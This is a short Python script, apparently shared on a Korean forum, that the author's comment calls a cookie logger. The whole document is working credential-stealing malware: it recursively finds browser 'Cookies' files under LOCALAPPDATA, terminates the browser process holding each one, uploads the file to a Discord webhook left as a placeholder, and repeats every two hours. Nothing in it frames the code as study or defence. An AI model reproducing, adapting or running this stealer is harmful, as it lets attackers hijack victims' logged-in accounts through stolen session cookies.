import os
import glob
import requests
import psutil
import signal
import time 
##쿠키 로거인데요 그냥 예전에 만들었던것중에 기억나서 보여드립니다

WEBHOOK_URL = '디스코드 웹후크 여기에 적으면 됩니다'

localappdata = os.getenv('LOCALAPPDATA')
search_pattern = os.path.join(localappdata, '**', 'Cookies')
def findfiles(pattern):
    return glob.glob(pattern, recursive=True)
def sendwebhook(file_path):
    with open(file_path, 'rb') as f:
        files = {'file': (file_path, f)}
        data = {'content': f'쿠키파일 경로: {file_path}'}
        requests.post(WEBHOOK_URL, data=data, files=files)


def turnoffprocessusingfile(file_path):
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            for file in proc.open_files():
                if file.path == file_path:
                    proc.send_signal(signal.SIGTERM)
                    proc.wait(timeout=5)
                    return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue
    return False


def main():
    files = findfiles(search_pattern)
    if files:
        for file_path in files:
            if  turnoffprocessusingfile(file_path):
                sendwebhook(file_path)


if __name__ == "__main__":
    while True:
        main()
        time.sleep(7200)
